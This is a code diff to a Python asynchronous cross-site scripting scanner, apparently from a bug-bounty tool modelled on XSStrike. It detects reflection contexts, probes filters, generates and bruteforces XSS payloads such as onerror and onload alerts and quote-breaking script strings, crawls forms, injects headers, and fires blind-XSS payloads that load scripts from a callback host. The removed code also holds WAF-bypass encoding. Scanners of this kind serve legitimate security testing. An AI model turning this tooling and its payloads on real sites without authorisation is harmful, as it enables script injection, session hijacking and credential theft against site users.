-            if probe not in body:
-                return {'reflected': False, 'type': 'unknown'}
-            
-            # Analyze context
-            pos = body.find(probe)
-            window = 100
-            before = body[max(0, pos-window):pos]
-            after = body[pos+len(probe):pos+len(probe)+window]
-            
-            context_type = 'html'
-            
-            # Check for attribute context
-            if re.search(r'\w+=["\'][^"\']*$', before) and re.search(r'^[^"\']*["\']', after):
-                context_type = 'attribute'
-            # Check for script context
-            elif '<script' in before.lower() and '</script>' in after.lower():
-                context_type = 'script'
-                # Check if inside string
-                quotes = before.count('"') + before.count("'")
-                if quotes % 2 == 1:
-                    context_type = 'script_string'
-            # Check for URL context
-            elif re.search(r'(href|src|action)=["\'][^"\']*$', before, re.I):
-                context_type = 'url'
-            # Check for style context
-            elif '<style' in before.lower() and '</style>' in after.lower():
-                context_type = 'style'
-            # Check for template contexts
-            elif '{{' in before or '${' in before:
-                context_type = 'js_template'
-            
-            return {
-                'reflected': True,
-                'type': context_type,
-                'before': before,
-                'after': after
-            }
-            
-        except Exception as e:
-            self.logger.debug(f"Context detection error: {e}")
-            return {'reflected': False, 'type': 'unknown'}
-    
-    def _select_payloads(self, context: str) -> List[XSSPayload]:
-        """Select appropriate payloads for context"""
-        base_payloads = self.payloads.get(context, self.payloads['html'])
-        
-        # If WAF detected, prioritize bypass payloads
-        if self.waf_detected:
-            bypass_payloads = [p for p in base_payloads if p.waf_bypass]
-            if bypass_payloads:
-                return bypass_payloads
-        
-        # Limit based on scope
-        return base_payloads[:15]
-    
-    async def _test_payload(self, target: str, param: str, payload_obj: XSSPayload, context: Dict) -> bool:
-        """Test specific payload"""
-        # Apply evasion encoding
-        payload = self._apply_encoding(payload_obj.payload, payload_obj.encoding_chain)
-        
-        test_url = f"{target}?{param}={quote(payload)}"
-        
-        try:
-            resp = await self._make_request(test_url)
-            if not resp:
-                return False
-            
-            body = await resp.text()
-            
-            if self._confirm_xss(body, payload_obj.payload, context['type']):
-                finding = self._create_finding(
-                    target, param, payload_obj, context['type'], 'Reflected'
+            if check_str.lower() in body.lower() or probe_str.lower() in body.lower():
+                allowed.add(probe_str)
+        return allowed
+
+    def _generate_vectors(self, occurences: Dict,
+                          allowed: Set[str]) -> Dict[int, Set[str]]:
+        """
+        Build ranked payloads for each reflection context.
+        Returns {confidence_score: {payload, ...}} matching XSStrike format.
+        """
+        vectors: Dict[int, Set[str]] = {i: set() for i in range(1, 12)}
+
+        for _, occ in occurences.items():
+            ctx     = occ['context']
+            details = occ.get('details', {})
+
+            if ctx == 'html':
+                for p in _gen_html_payloads(allowed):
+                    vectors[10].add(p)
+                # lower-confidence fallbacks
+                vectors[6].add('<img src=x onerror=alert(1)>')
+                vectors[6].add('<svg onload=alert(1)>')
+
+            elif ctx == 'attribute':
+                quote_char = details.get('quote', '"')
+                for p in _gen_attribute_payloads(quote_char, allowed):
+                    vectors[9].add(p)
+                vectors[7].add(f'\\{quote_char} autofocus onfocus=alert(1) //')
+
+            elif ctx == 'script':
+                quote_char = details.get('quote', '"')
+                for p in _gen_script_payloads(quote_char):
+                    vectors[8].add(p)
+                vectors[11].add(f'{quote_char}+alert(1)//')
+                vectors[11].add(f'{quote_char};alert(1)//')
+
+            elif ctx == 'comment':
+                if '<' in allowed and '>' in allowed:
+                    vectors[10].add('--><img src=x onerror=alert(1)>')
+                    vectors[10].add('--><svg onload=alert(1)>')
+
+        return vectors
+
+    async def _verify_payload(self, target: str, param: str,
+                              payload: str, occurences: Dict,
+                              confidence: int) -> bool:
+        """
+        Re-send payload and measure match efficiency against reflection.
+        Reports finding if efficiency ≥ MIN_EFFICIENCY.
+        """
+        test_url = self._build_url(target, param, payload)
+        resp = await self._make_request(test_url)
+        if not resp:
+            return False
+        body = await resp.text()
+
+        # Quick string presence check first
+        p_lower = payload.lower().replace('"', '').replace("'", '')
+        if any(fragment in body.lower() for fragment in
+               ['alert(1)', 'onerror=', 'onload=', 'onfocus=', 'javascript:']):
+            # Do a fuzz-ratio estimation (poor-man's fuzz without fuzzywuzzy)
+            efficiency = self._estimate_efficiency(body, payload)
+            if efficiency >= MIN_EFFICIENCY:
+                xss_type = self._classify_xss_type(occurences)
+                finding  = self._create_finding(
+                    target, param, payload, list(occurences.values())[0]['context'],
+                    xss_type, confidence, efficiency
                 )
                 self.findings.append(finding)
                 self.add_finding(finding)
                 return True
-                
-        except Exception as e:
-            self.logger.debug(f"Payload test error: {e}")
-        
         return False
-    
-    def _apply_encoding(self, payload: str, encoding_chain: List[str]) -> str:
-        """Apply encoding chain to payload"""
-        result = payload
-        
-        for encoding in encoding_chain:
-            if encoding == 'url_encode':
-                result = quote(result, safe='')
-            elif encoding == 'html_entities':
-                result = ''.join(f'&#{ord(c)};' for c in result)
-            elif encoding == 'unicode_escape':
-                result = result.replace('a', '\\u0061')  # Example: alert -> \u0061lert
-        
-        return result
-    
-    def _confirm_xss(self, body: str, original_payload: str, context: str) -> bool:
-        """Confirm XSS execution in response"""
-        decoded = unquote(body)
-        
-        # Check for execution indicators
-        indicators = [
-            r'<script[^>]*>[^<]*alert\s*\(\s*1\s*\)',
-            r'on\w+\s*=\s*["\']?[^"\']*alert\s*\(\s*1\s*\)',
-            r'javascript\s*:\s*alert\s*\(\s*1\s*\)',
-        ]
-        
-        for pattern in indicators:
-            if re.search(pattern, decoded, re.I):
-                return True
-        
-        # Context-specific checks
-        if context == 'script' and 'alert(1)' in decoded:
-            return True
-        if context == 'attribute' and re.search(r'\s\w+\s*=\s*["\'][^"\']*alert', decoded):
-            return True
-        
-        return False
-    
-    def _create_finding(self, target: str, param: str, payload: XSSPayload, 
-                       context: str, xss_type: str) -> Finding:
-        """Create XSS Finding object"""
-        
-        severity_map = {
-            'Stored': 'Critical',
-            'DOM-based': 'High',
-            'Reflected': payload.severity,
-            'Header-based': 'Medium',
-            'Blind': 'High'
-        }
-        
-        cvss_map = {
-            'Stored': 9.1,
-            'DOM-based': 7.1,
-            'Reflected': 6.1,
-            'Header-based': 5.3,
-            'Blind': 7.5
-        }
-        
-        bounty_map = {
-            'Stored': 5000,
-            'DOM-based': 2500,
-            'Reflected': 1500,
-            'Header-based': 1000,
-            'Blind': 3000
-        }
-        
-        title = f"[{xss_type}] XSS in '{param}' parameter ({context} context)"
 
-        return Finding(
-            module='xss',
-            title=title,
-            severity=severity_map.get(xss_type, payload.severity),
-            description=f"""## Cross-Site Scripting (XSS) Vulnerability
+    def _estimate_efficiency(self, body: str, payload: str) -> int:
+        """
+        Estimate how much of payload survived filtering (0-100).
+        Replaces fuzzywuzzy.fuzz.partial_ratio with a pure-stdlib version.
+        """
+        body_lower    = body.lower()
+        payload_lower = payload.lower()
+        if payload_lower in body_lower:
+            return 100
+        # count matching chars in order
+        matches = 0
+        bi = 0
+        for ch in payload_lower:
+            idx = body_lower.find(ch, bi)
+            if idx != -1:
+                matches += 1
+                bi = idx + 1
+        return int(100 * matches / max(len(payload_lower), 1))
 
-**Type:** {xss_type}
-**Parameter:** `{param}`
-**Context:** {context}
-**Severity:** {payload.severity}
+    def _classify_xss_type(self, occurences: Dict) -> str:
+        ctx = list(occurences.values())[0]['context'] if occurences else 'html'
+        return 'DOM-based' if ctx == 'dom' else 'Reflected'
 
-### Payload
-```html
-{payload.payload}
-```
+    # ══════════════════════════════════════════════════════════════════════════
+    #  Phase 4 — Form Crawl  (XSStrike crawl.py logic)
+    # ══════════════════════════════════════════════════════════════════════════
 
-### Impact
-An attacker can execute arbitrary JavaScript in victims' browsers, leading to
-session hijacking, credential theft, defacement, or malware distribution.
+    async def _crawl_forms(self, target: str):
+        """Discover and test all HTML forms on the page."""
+        resp = await self._make_request(target)
+        if not resp:
+            return
+        body   = await resp.text()
+        parsed = urlparse(target)
+        scheme = parsed.scheme
+        host   = parsed.netloc
 
-### WAF Bypass
-{"WAF bypass techniques used: " + ', '.join(payload.waf_bypass) if payload.waf_bypass else "No WAF bypass required"}
-""",
-            evidence={
-                'parameter': param,
-                'payload': payload.payload,
-                'context': context,
-                'xss_type': xss_type,
-                'waf_bypass': payload.waf_bypass,
-            },
-            poc=f"Navigate to: {target}?{param}={quote(payload.payload)}",
-            remediation='Encode all user-supplied output. Implement a strict Content-Security-Policy. Use HTTPOnly and Secure cookie flags.',
-            cvss_score=cvss_map.get(xss_type, 6.1),
-            bounty_score=bounty_map.get(xss_type, 1500),
-            target=target
+        forms = re.findall(
+            r'<form(?P<attrs>[^>]*)>(?P<inner>.*?)</form>',
+            body, re.DOTALL | re.I
         )
-        return finding
 
-    async def _test_dom_xss(self, target: str, params: Dict):
-        """Test for DOM-based XSS"""
-        dom_payloads = self.payloads.get('dom', [])
-        url_params = params.get('url_params', [])
+        for attrs, inner in forms:
+            # action URL
+            action_m = re.search(r'action=["\']([^"\']*)["\']', attrs, re.I)
+            action   = action_m.group(1) if action_m else target
 
-        for param in url_params:
-            for payload_obj in dom_payloads:
-                try:
-                    test_url = f"{target}?{param}={quote(payload_obj.payload)}"
-                    resp = await self._make_request(test_url)
-                    if not resp:
-                        continue
-                    body = await resp.text()
-                    if self._confirm_xss(body, payload_obj.payload, 'dom'):
-                        finding = self._create_finding(target, param, payload_obj, 'dom', 'DOM-based')
-                        self.findings.append(finding)
-                        self.add_finding(finding)
-                        break
-                except Exception as e:
-                    self.logger.debug(f"DOM XSS test error: {e}")
+            if not action.startswith('http'):
+                if action.startswith('//'):
+                    action = f'{scheme}:{action}'
+                elif action.startswith('/'):
+                    action = f'{scheme}://{host}{action}'
+                else:
+                    action = f'{scheme}://{host}/{action}'
 
-    async def _test_blind_xss(self, target: str, params: Dict):
-        """Test for Blind XSS using a canary marker"""
-        canary = f"RAPTOR-BLIND-{hash(target) % 99999}"
-        blind_payload = XSSPayload(
-            f'<script src="https://example.com/x?c={canary}"></script>',
-            'html', severity='High'
-        )
-        url_params = params.get('url_params', [])
+            method_m = re.search(r'method=["\'](\w+)["\']', attrs, re.I)
+            method   = (method_m.group(1) if method_m else 'GET').upper()
 
-        for param in url_params[:5]:  # limit blind tests
-            try:
-                test_url = f"{target}?{param}={quote(blind_payload.payload)}"
-                await self._make_request(test_url)
-                # Blind XSS can't be confirmed without callback server — report as potential
-                finding = self._create_finding(target, param, blind_payload, 'html', 'Blind')
-                finding.title = f"[Blind/Potential] XSS in '{param}' parameter"
-                finding.description = (
-                    f"Blind XSS payload injected into '{param}'. "
-                    f"Canary: {canary}. Confirm via out-of-band callback."
-                )
-                self.findings.append(finding)
-                self.add_finding(finding)
-            except Exception as e:
-                self.logger.debug(f"Blind XSS error: {e}")
+            # collect inputs
+            inputs: Dict[str, str] = {}
+            for inp in re.finditer(
+                r'<input[^>]*name=["\']([^"\']+)["\'][^>]*(?:value=["\']([^"\']*)["\'])?',
+                inner, re.I
+            ):
+                inputs[inp.group(1)] = inp.group(2) or ''
 
-    async def _test_header_xss(self, target: str):
-        """Test XSS via HTTP headers"""
-        injectable_headers = ['User-Agent', 'Referer', 'X-Forwarded-For', 'X-Forwarded-Host']
-        payload_obj = XSSPayload('<script>alert(1)</script>', 'html', severity='Medium')
+            if not inputs:
+                continue
 
-        for header in injectable_headers:
-            try:
-                resp = await self._make_request(target, headers={header: payload_obj.payload})
-                if not resp:
+            # track which params we've tested on this form
+            if action not in self.checked_forms:
+                self.checked_forms[action] = []
+
+            for param in inputs:
+                if param in self.checked_forms[action]:
                     continue
-                body = await resp.text()
-                if self._confirm_xss(body, payload_obj.payload, 'html'):
-                    finding = self._create_finding(target, header, payload_obj, 'html', 'Header-based')
+                self.checked_forms[action].append(param)
+                await self._xsstrike_scan_param_form(action, method, inputs, param)
+
+    async def _xsstrike_scan_param_form(self, url: str, method: str,
+                                        base_params: Dict[str, str],
+                                        target_param: str):
+        """Run the XSStrike pipeline against a form parameter."""
+        params_copy = copy.deepcopy(base_params)
+        params_copy[target_param] = XSSCHECKER
+
+        if method == 'POST':
+            resp = await self._make_request(url, method='POST', data=params_copy)
+        else:
+            query = '&'.join(f'{k}={quote(v)}' for k, v in params_copy.items())
+            resp  = await self._make_request(f'{url}?{query}')
+
+        if not resp:
+            return
+        body = await resp.text()
+        if XSSCHECKER not in body.lower():
+            return
+
+        occurences = _html_parser(body, XSSCHECKER)
+        if not occurences:
+            return
+
+        allowed = await self._filter_check_form(url, method, base_params,
+                                                target_param, occurences)
+        vectors = self._generate_vectors(occurences, allowed)
+
+        for confidence, payloads in sorted(vectors.items(), reverse=True):
+            for raw_payload in list(payloads)[:5]:
+                params_copy[target_param] = raw_payload
+                if method == 'POST':
+                    resp2 = await self._make_request(url, method='POST', data=params_copy)
+                else:
+                    query2 = '&'.join(f'{k}={quote(v)}' for k, v in params_copy.items())
+                    resp2  = await self._make_request(f'{url}?{query2}')
+
+                if not resp2:
+                    continue
+                body2 = await resp2.text()
+                eff   = self._estimate_efficiency(body2, raw_payload)
+                if eff >= MIN_EFFICIENCY:
+                    finding = self._create_finding(
+                        url, target_param, raw_payload,
+                        list(occurences.values())[0]['context'],
+                        'Reflected', confidence, eff
+                    )
                     self.findings.append(finding)
                     self.add_finding(finding)
-            except Exception as e:
-                self.logger.debug(f"Header XSS error: {e}")
+                    return
 
-    async def _store_findings(self):
-        """Persist findings to database"""
-        if self.db:
-            for finding in self.findings:
-                try:
-                    self.db.save_finding(finding)
-                except Exception:
-                    pass
+    async def _filter_check_form(self, url: str, method: str,
+                                 base_params: Dict, target_param: str,
+                                 occurences: Dict) -> Set[str]:
+        allowed: Set[str] = set()
+        for probe_str in FILTER_PROBES:
+            check_str = XSSCHECKER + probe_str + 'end'
+            params_copy = copy.deepcopy(base_params)
+            params_copy[target_param] = check_str
+            if method == 'POST':
+                resp = await self._make_request(url, method='POST', data=params_copy)
+            else:
+                query = '&'.join(f'{k}={quote(v)}' for k, v in params_copy.items())
+                resp  = await self._make_request(f'{url}?{query}')
+            if not resp:
+                continue
+            body = await resp.text()
+            if probe_str.lower() in body.lower():
+                allowed.add(probe_str)
+        return allowed
+
+    # ══════════════════════════════════════════════════════════════════════════
+    #  Phase 5 — Wordlist Bruteforce  (XSStrike bruteforcer logic)
+    # ══════════════════════════════════════════════════════════════════════════
+
+    async def _bruteforce(self, target: str, params: List[str]):
+        """Send every payload from the wordlist for each parameter."""
+        self.logger.info(f'   Bruteforcing {len(self.wordlist)} payloads × {len(params[:5])} params')
+        sem = asyncio.Semaphore(5)
+
+        async def try_payload(param: str, payload: str):
+            async with sem:
+                if param in self.tested_params:
+                    return
+                url  = self._build_url(target, param, payload)
+                resp = await self._make_request(url)
+                if not resp:
+                    return
+                body = await resp.text()
+                eff  = self._estimate_efficiency(body, payload)
+                if eff >= MIN_EFFICIENCY:
+                    occurences = _html_parser(body, payload[:20])
+                    ctx = list(occurences.values())[0]['context'] if occurences else 'html'
+                    finding = self._create_finding(
+                        target, param, payload, ctx, 'Reflected', 5, eff
+                    )
+                    self.findings.append(finding)
+                    self.add_finding(finding)
+                    self.tested_params.add(param)
+
+        tasks = [
+            try_payload(param, payload)
+            for param in params[:5]                # cap params for bruteforce
+            for payload in self.wordlist[:100]     # cap payloads per run
+        ]
+        await asyncio.gather(*tasks, return_exceptions=True)
+
+    # ══════════════════════════════════════════════════════════════════════════
+    #  Phase 6 — Blind XSS
+    # ══════════════════════════════════════════════════════════════════════════
+
+    async def _test_blind_xss(self, target: str, params: List[str]):
+        canary = hashlib.md5(target.encode()).hexdigest()[:8]
+        cb_url = self.blind_cb or f'https://your-callback-server.com/x?c={canary}'
+
+        blind_payloads = [
+            f'<script src="{cb_url}"></script>',
+            f'"><script src="{cb_url}"></script>',
+            f'<img src=x onerror="var s=document.createElement(\'script\');s.src=\'{cb_url}\';document.head.appendChild(s)">',
+        ]
+
+        for param in params[:5]:
+            for payload in blind_payloads:
+                url = self._build_url(target, param, payload)
+                await self._make_request(url)  # fire-and-forget
+
+        finding = Finding(
+            module      = 'xss',
+            title       = f'[Blind XSS] Canary payload injected — awaiting callback',
+            severity    = 'High',
+            description = (
+                f'## Blind XSS — Out-of-Band Detection\n\n'
+                f'Canary `{canary}` injected into {len(params[:5])} parameter(s).\n\n'
+                f'**Callback URL:** `{cb_url}`\n\n'
+                'Monitor the callback server for incoming requests containing the canary.\n\n'
+                '### Remediation\nEncode all user input on output; implement a strict CSP.'
+            ),
+            evidence    = {'canary': canary, 'callback': cb_url, 'params': params[:5]},
+            poc         = f'Check {cb_url} for canary={canary}',
+            remediation = 'Encode user-supplied output; set Content-Security-Policy.',
+            cvss_score  = 7.5,
+            bounty_score= 3000,
+            target      = target,
+        )
+        self.findings.append(finding)
+        self.add_finding(finding)
+
+    # ══════════════════════════════════════════════════════════════════════════
+    #  Phase 7 — Header Injection
+    # ══════════════════════════════════════════════════════════════════════════
+
+    async def _test_header_xss(self, target: str):
+        headers_to_test = [
+            'User-Agent', 'Referer', 'X-Forwarded-For',
+            'X-Forwarded-Host', 'Origin', 'Accept-Language',
+        ]
+        payload = '<img src=x onerror=alert(1)>'
+
+        for header in headers_to_test:
+            resp = await self._make_request(target, headers={header: payload})
+            if not resp:
+                continue
+            body = await resp.text()
+            eff  = self._estimate_efficiency(body, payload)
+            if eff >= MIN_EFFICIENCY:
+                finding = self._create_finding(
+                    target, header, payload, 'html', 'Header-based', 5, eff
+                )
+                self.findings.append(finding)
+                self.add_finding(finding)
+
+    # ══════════════════════════════════════════════════════════════════════════
+    #  Finding factory
+    # ══════════════════════════════════════════════════════════════════════════
+
+    def _create_finding(self, target: str, param: str, payload: str,
+                        context: str, xss_type: str,
+                        confidence: int, efficiency: int) -> Finding:
+
+        severity_map  = {'Stored': 'Critical', 'DOM-based': 'High',
+                         'Reflected': 'High', 'Header-based': 'Medium',
+                         'Blind': 'High'}
+        cvss_map      = {'Stored': 9.1, 'DOM-based': 7.1,
+                         'Reflected': 6.1, 'Header-based': 5.3, 'Blind': 7.5}
+        bounty_map    = {'Stored': 5000, 'DOM-based': 2500,
+                         'Reflected': 1500, 'Header-based': 1000, 'Blind': 3000}
+
+        waf_note = (f'WAF detected ({self.waf_name}) — bypass techniques applied.'
+                    if self.waf_name else 'No WAF detected.')
+
+        return Finding(
+            module      = 'xss',
+            title       = f'[{xss_type}] XSS in "{param}" ({context} context)',
+            severity    = severity_map.get(xss_type, 'High'),
+            description = (
+                f'## Cross-Site Scripting ({xss_type})\n\n'
+                f'**Parameter:** `{param}`  \n'
+                f'**Context:** {context}  \n'
+                f'**Engine Confidence:** {confidence}/11  \n'
+                f'**Filter Efficiency:** {efficiency}%  \n'
+                f'**WAF:** {waf_note}\n\n'
+                f'### Payload\n```html\n{payload}\n```\n\n'
+                '### Impact\n'
+                'Arbitrary JavaScript execution in victim browsers: '
+                'session hijacking, credential theft, phishing, defacement.\n\n'
+                '### Remediation\n'
+                'Output-encode all user data; deploy Content-Security-Policy; '
+                'use HTTPOnly + Secure cookie flags.'
+            ),
+            evidence    = {
+                'parameter':  param,
+                'payload':    payload,
+                'context':    context,
+                'xss_type':   xss_type,
+                'confidence': confidence,
+                'efficiency': efficiency,
+                'waf':        self.waf_name,
+            },
+            poc         = f'Navigate to: {target}?{param}={quote(payload)}',
+            remediation = (
+                'Encode all user-supplied output (HTML, JS, URL context). '
+                'Implement a strict Content-Security-Policy. '
+                'Set HTTPOnly and Secure flags on session cookies.'
+            ),
+            cvss_score  = cvss_map.get(xss_type, 6.1),
+            bounty_score= bounty_map.get(xss_type, 1500),
+            target      = target,
+        )
+
+    # ══════════════════════════════════════════════════════════════════════════
+    #  Helpers
+    # ══════════════════════════════════════════════════════════════════════════
+
+    def _build_url(self, base: str, param: str, value: str) -> str:
+        """Append or replace a single parameter in the URL."""
+        parsed = urlparse(base)
+        qs     = parse_qs(parsed.query)
+        qs[param] = [value]
+        new_query = '&'.join(
+            f'{k}={quote(v[0], safe="")}' for k, v in qs.items()
+        )
+        return parsed._replace(query=new_query).geturl()
